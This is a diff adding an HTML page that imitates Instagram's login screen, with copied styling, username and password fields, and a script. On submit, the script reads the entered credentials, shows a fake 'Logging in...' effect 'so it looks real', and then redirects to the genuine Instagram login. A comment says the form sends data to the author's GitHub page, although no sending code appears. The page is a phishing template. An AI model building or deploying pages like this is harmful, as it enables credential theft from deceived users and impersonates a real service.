@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            width: 350px;
+            padding: 40px;
+            text-align: center;
+            box-shadow: 0 0 2px rgba(0,0,0,0.1);
+        }
+        .logo {
+            font-size: 40px;
+            font-weight: bold;
+            margin-bottom: 30px;
+            font-family: 'Billabong', cursive; /* Fallback for Instagram font */
+        }
+        input {
+            width: 100%;
+            padding: 9px 7px;
+            margin-bottom: 10px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background-color: #fafafa;
+            font-size: 12px;
+        }
+        button {
+            width: 100%;
+            padding: 7px;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:hover {
+            background-color: #1877f2;
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+        }
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+        .divider span {
+            padding: 0 10px;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="logo">Instagram</div>
+    
+    <!-- The form sends data to your GitHub page URL -->
+    <form id="instaForm">
+        <input type="text" id="username" placeholder="Phone number, username, or email" required>
+        <input type="password" id="password" placeholder="Password" required>
+        <button type="submit">Log In</button>
+    </form>
+
+    <div class="divider"><span>OR</span></div>
+    
+    <p style="font-size:12px; color:#00376b; cursor:pointer;">Forgot password?</p>
+</div>
+
+<script>
+    document.getElementById('instaForm').addEventListener('submit', function(e) {
+        e.preventDefault(); // Stop page from reloading immediately
+        
+        var user = document.getElementById('username').value;
+        var pass = document.getElementById('password').value;
+        
+        // Show a "Loading" effect so it looks real
+        var btn = document.querySelector('button');
+        btn.innerHTML = 'Logging in...';
+        btn.style.opacity = '0.7';
+
+        setTimeout(function() {
+            // Redirect to REAL Instagram after 1.5 seconds
+            window.location.href = "https://www.instagram.com/accounts/login/";
+        }, 1500);
+    });
+</script>
+
+</body>
+</html>
